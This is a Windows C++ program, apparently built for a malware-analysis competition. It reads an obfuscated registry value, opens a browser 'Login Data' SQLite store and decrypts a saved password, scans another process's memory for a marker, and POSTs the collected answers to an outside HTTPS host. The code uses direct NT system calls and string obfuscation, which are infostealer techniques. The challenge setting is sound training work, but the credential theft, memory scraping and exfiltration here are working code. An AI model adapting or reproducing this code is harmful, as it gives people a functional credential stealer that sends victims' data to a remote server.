#include "NT.h"
#include "Types.h"
#include "Types2.h"
#include "String.h"
#include <stdio.h>
#include <winsqlite/winsqlite3.h>
#include <bcrypt.h>
#include <Windows.h>
#include <winhttp.h>
#include <winternl.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "winsqlite3.lib")
#pragma comment(lib, "bcrypt.lib")

NTSTATUS status = 0;

uintptr_t kernel32 = 0;
void(__stdcall* sleep)(int seconds);

struct AES
{
	char key[32];
	char iv[16];
	char* ciphertext;
};
// REMEMBER TO ENABLE DEBUG CHECKING ON THE REAL THING

bool ChallengeOne(WinDEF::KEY_VALUE_PARTIAL_INFORMATION* KeyValue, unsigned long buffer_size)
{
	WinDEF::HANDLE hKey = 0;
	WinDEF::OBJECT_ATTRIBUTES KeyObj;
	WinDEF::UNICODE_STRING KeyPath;
	ULONG ReturnLen;
	wchar_t key_dir[35] = L"xvACMWPV]xiEGLMJAxwKBPSEVAxfKIFA";
	wchar_t answer_1[10] = L"EJWSAV{\x15";

	memset_custom(&KeyPath, 0, sizeof(WinDEF::UNICODE_STRING));
	NT::RtlInitUnicodeString(&KeyPath, wstrdecrypt(key_dir));

	memset_custom(&KeyObj, 0, sizeof(WinDEF::OBJECT_ATTRIBUTES));
	KeyObj.Length = sizeof(KeyObj);
	KeyObj.ObjectName = &KeyPath;
	KeyObj.Attributes = OBJ_CASE_INSENSITIVE;

	status = NT::NtOpenKey(&hKey, GENERIC_READ, &KeyObj);
	if (status != STATUS_SUCCESS)
		return false;

	memset_custom(&KeyPath, 0, sizeof(WinDEF::UNICODE_STRING));
	NT::RtlInitUnicodeString(&KeyPath, wstrdecrypt(answer_1));

	status = NT::NtQueryValueKey(hKey, &KeyPath, WinDEF::KeyValuePartialInformation, KeyValue, buffer_size, &ReturnLen);
	if (status != STATUS_SUCCESS)
	{
		NT::NtClose(hKey);
		return false;
	}
	
	NT::NtClose(hKey);
	return true;
}

char* DecryptSqlite3(char* info)
{
	NTSTATUS status = 0;
	AES code;
	BCRYPT_ALG_HANDLE bHandle;
	BCRYPT_KEY_HANDLE hKey;
	DWORD dwObjectLength, dwDataLength;
	SIZE_T AllocationSize;
	ULONG ZeroBits = 0;
	int ciphertext_len;
	char* key_object = 0;
	char* szDecrypted = 0;
	char hex_info[1024];
	char* hex_ciphertext;
	char temp_ciphertext[256];
	char temp_iv[40];

	HexToBytes(info, strlen_custom(info), hex_info);

	ciphertext_len = strlen_custom(info + (sizeof(code.iv) * 2));

	memset_custom(temp_ciphertext, 0, sizeof(temp_ciphertext));
	memset_custom(temp_iv, 0, sizeof(temp_iv));

	memcpy_custom(code.iv, hex_info, sizeof(code.iv));
	hex_ciphertext = hex_info + sizeof(code.iv);

	memset_custom(code.key, '0', sizeof(code.key));
	code.ciphertext = hex_ciphertext;

	status = BCryptOpenAlgorithmProvider(&bHandle, BCRYPT_AES_ALGORITHM, 0, 0);
	if (status != STATUS_SUCCESS)
		return 0;

	status = BCryptGetProperty(bHandle, BCRYPT_OBJECT_LENGTH, (PUCHAR)&dwObjectLength, sizeof(dwObjectLength), &dwDataLength, 0);
	if (status != STATUS_SUCCESS)
	{
		BCryptCloseAlgorithmProvider(bHandle, 0);
		return 0;
	}

	AllocationSize = (SIZE_T)dwObjectLength;
	status = NT::NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&key_object, ZeroBits, &AllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		BCryptCloseAlgorithmProvider(bHandle, 0);
		return 0;
	}

	status = BCryptGenerateSymmetricKey(bHandle, &hKey, (PUCHAR)key_object, dwObjectLength, (PUCHAR)code.key, sizeof(code.key), 0);
	if (status != STATUS_SUCCESS)
	{
		BCryptCloseAlgorithmProvider(bHandle, 0);
		return 0;
	}

	status = BCryptSetProperty(hKey, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (status != STATUS_SUCCESS)
	{
		NT::NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&key_object, 0, MEM_RELEASE);
		BCryptDestroyKey(hKey);
		BCryptCloseAlgorithmProvider(bHandle, 0);
		return 0;
	}

	szDecrypted = 0;
	AllocationSize = (SIZE_T)strlen_custom(code.ciphertext);
	status = NT::NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&szDecrypted, ZeroBits, &AllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		NT::NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&key_object, 0, MEM_RELEASE);
		BCryptDestroyKey(hKey);
		BCryptCloseAlgorithmProvider(bHandle, 0);
		return 0;
	}
	memset_custom(szDecrypted, 0, (int)AllocationSize);

	status = BCryptDecrypt(hKey, (PUCHAR)code.ciphertext, ciphertext_len / 2, 0, (PUCHAR)code.iv, sizeof(code.iv), (PUCHAR)szDecrypted, (ULONG)AllocationSize, &dwDataLength, 0);
	if (status != STATUS_SUCCESS)
	{
		NT::NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&szDecrypted, 0, MEM_RELEASE);
		szDecrypted = 0;
	}
	
	NT::NtFreeVirtualMemory((HANDLE)-1, (PVOID*)&key_object, 0, MEM_RELEASE);
	BCryptDestroyKey(hKey);
	BCryptCloseAlgorithmProvider(bHandle, 0);
	return szDecrypted;
}

bool ChallengeTwo(char** buffer)
{
	sqlite3* db = 0;
	sqlite3_stmt* stmt = 0;
	const char* query = "SELECT * FROM logins;";
	int column_count = 0;
	bool result;

	if (sqlite3_open_v2("C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data", &db, SQLITE_READONLY, 0) != SQLITE_OK)
		//return false;
	//if (sqlite3_open_v2("C:\\Users\\Night\\OneDrive\\Desktop\\Login Data", &db, SQLITE_OPEN_READONLY, 0) != SQLITE_OK)
		return false;

	if (sqlite3_prepare_v2(db, query, -1, &stmt, 0) != SQLITE_OK)
	{
		sqlite3_close(db);
		return false;
	}

	column_count = sqlite3_column_count(stmt);

	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		if (strcmp_custom("bombe", strlen_custom("bombe"), (const char*)sqlite3_column_text(stmt, 2)) == 0)
			break;
	}

	*buffer = DecryptSqlite3((char*)sqlite3_column_text(stmt, 3));

	sqlite3_finalize(stmt);
	sqlite3_close(db);

	return (uintptr_t)*buffer > 0;
}

DWORD GetRemoteProcessId(wchar_t* procname)
{
	DWORD PID = 0;
	PVOID buffer = 0;
	ULONG ZeroBits = 0;
	SIZE_T AllocationSize = (SIZE_T)(1024 * 1024);
	
	status = NT::NtAllocateVirtualMemory((HANDLE)-1, &buffer, ZeroBits, &AllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
		return 0;
	WinDEF::PSYSTEM_PROCESS_INFORMATION spi = (WinDEF::PSYSTEM_PROCESS_INFORMATION)buffer;

	status = NT::NtQuerySystemInformation(WinDEF::SystemProcessInformation, buffer, (ULONG)AllocationSize, 0);
	if (status != STATUS_SUCCESS)
		return 0;
	
	spi = (WinDEF::SYSTEM_PROCESS_INFORMATION*)((uintptr_t)spi + spi->NextEntryOffset);
	while (true) {
		if (spi->ImageName.Buffer == 0)
			goto NextEntry;

		if (wstrcmp_custom(spi->ImageName.Buffer, wstrlen_custom(procname), procname) == 0)
		{
			PID = (DWORD)spi->UniqueProcessId;
			break;
		}
NextEntry:
		if (spi->NextEntryOffset == 0) {
			break;
		}
		spi = reinterpret_cast<WinDEF::SYSTEM_PROCESS_INFORMATION*>(
			reinterpret_cast<BYTE*>(spi) + spi->NextEntryOffset
			);
	}
	return PID;
}

bool ChallengeThree(char** buffer)
{
	HANDLE hProc;
	WinDEF::OBJECT_ATTRIBUTES clientObj = { 0 };
	WinDEF::CLIENT_ID clientId = { 0 };
	MEMORY_BASIC_INFORMATION MemoryInformation = { 0 };
	SIZE_T MemoryInformationLen = (SIZE_T)sizeof(MemoryInformation);
	SIZE_T ReturnLength = 0;
	SIZE_T AllocationSize;
	PVOID address = 0;
	ULONG ZeroBits = 0;
	PVOID MemBuf = 0;
	wchar_t procname[255] = L"FWEWW\nA\\A";

	clientId.UniqueProcess = (HANDLE)GetRemoteProcessId(wstrdecrypt(procname));
	clientObj.Length = sizeof(clientObj);

	status = NT::NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &clientObj, &clientId);
	if (status != STATUS_SUCCESS)
	{
		NT::NtFreeVirtualMemory((HANDLE)-1, &MemBuf, 0, MEM_RELEASE);
		return false;
	}

	while(NT::NtQueryVirtualMemory(hProc, address, WinDEF::MemoryBasicInformation, &MemoryInformation, sizeof(MemoryInformation), 0) == STATUS_SUCCESS)
	{
		if (MemoryInformation.State == MEM_COMMIT && MemoryInformation.Protect == PAGE_READWRITE)
		{
			AllocationSize = MemoryInformation.RegionSize;
			MemBuf = 0;
			status = NT::NtAllocateVirtualMemory((HANDLE)-1, &MemBuf, ZeroBits, &AllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (status != STATUS_SUCCESS)
				return 0;
			if (NT::NtReadVirtualMemory(hProc, address, MemBuf, AllocationSize, &ReturnLength) == STATUS_SUCCESS)
			{
				for (int i = 0; i < ReturnLength; i++)
				{
					if (strstr((char*)((char*)MemBuf + i), "BOMBE"))
					{
						*buffer = (char*)((char*)MemBuf + i);
						return true;
					}
				}
			}
		}
		address = (PVOID)((uintptr_t)address + MemoryInformation.RegionSize);
	}

	return false;
}

bool SendAnswers(char* answer_1, char* answer_2, char* answer_3, const char* secret)
{
	HINTERNET hWeb;
	HINTERNET hConnect;
	HINTERNET hReq;
	DWORD dwBytes;
	DWORD dwDataSize;
	char buffer[512];
	char payload[512];
	unsigned int pos = 0;

	memset_custom(payload, 0, sizeof(payload));
	memset_custom(buffer, 0, sizeof(buffer));

	strcpy_custom(payload, (char*)"{answer_1:");
	pos += strlen_custom("{answer_1:");
	strcpy_custom(payload + pos, answer_1);
	pos += strlen_custom(answer_1);
	strcpy_custom(payload + pos, (char*)",answer_2:");
	pos += strlen_custom(",answer_2:");
	strcpy_custom(payload + pos, answer_2);
	pos += strlen_custom(answer_2) - 1;
	strcpy_custom(payload + pos, (char*)",answer_3:");
	pos += strlen_custom(",answer_3:");
	strcpy_custom(payload + pos, answer_3);
	pos += strlen_custom(answer_3);
	strcpy_custom(payload + pos, (char*)",secret:");
	pos += strlen_custom(",secret:");
	strcpy_custom(payload + pos, (char*)secret);
	pos += strlen_custom(secret);
	payload[pos++] = '}';

	hWeb = WinHttpOpen(L"MalChal", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (hWeb == 0)
		return false;

	hConnect = WinHttpConnect(hWeb, L"x.bombe.digitalplaguedoctors.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
	if (hConnect == 0)
	{
		WinHttpCloseHandle(hWeb);
		return false;
	}

	hReq = WinHttpOpenRequest(hConnect, L"POST", L"/submitMalAns", 0, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (hReq == 0)
	{
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hWeb);
		return false;
	}

	if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, payload, pos + 1, pos + 1, 0))
	{
		WinHttpCloseHandle(hReq);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hWeb);
		return false;
	}

	WinHttpCloseHandle(hReq);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hWeb);
}

int main(int argc, char* argv[])
{
	if (strstr_custom("Competition.exe", argv[0]) == 0)
		return 0;

	char answer_1[512];
	char KeyValueBuffer[512];
	WinDEF::KEY_VALUE_PARTIAL_INFORMATION* KeyValue = (WinDEF::KEY_VALUE_PARTIAL_INFORMATION*)KeyValueBuffer;

	if (!ChallengeOne(KeyValue, sizeof(KeyValueBuffer)))
		return 1;
	
	UniStringToAnsiString(answer_1, (wchar_t*)KeyValue->Data);
	printf("%s\n", answer_1);

	char* answer_2 = 0;
	if (!ChallengeTwo(&answer_2))
		return 1;
	printf("%s\n", answer_2);

	char* answer_3 = 0;
	if (!ChallengeThree(&answer_3))
		return 1;
	printf("%s\n", answer_3);

	SendAnswers(answer_1, answer_2, answer_3, "afe2dc277ec0b950054a188b39571394");
	return 0;
}